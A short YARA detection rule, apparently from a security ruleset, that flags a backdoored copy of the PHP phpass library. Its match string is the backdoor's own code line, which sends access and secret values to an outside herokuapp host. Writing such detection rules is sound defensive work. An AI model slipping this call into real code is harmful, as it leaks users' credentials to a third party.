rule VULN_PHP_Hack_Backdoored_Phpass_May21
{
	meta:
		description = "Detects backdoored PHP phpass version"
		author = "Christian Burkard"
		reference = "https://twitter.com/s0md3v/status/1529005758540808192"
		date = "2022-05-24"
		score = 75
		os = "windows,linux,macos,ios,android"
		filetype = "script"

	strings:
		$x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii

	condition:
		filesize <30KB and $x1
}
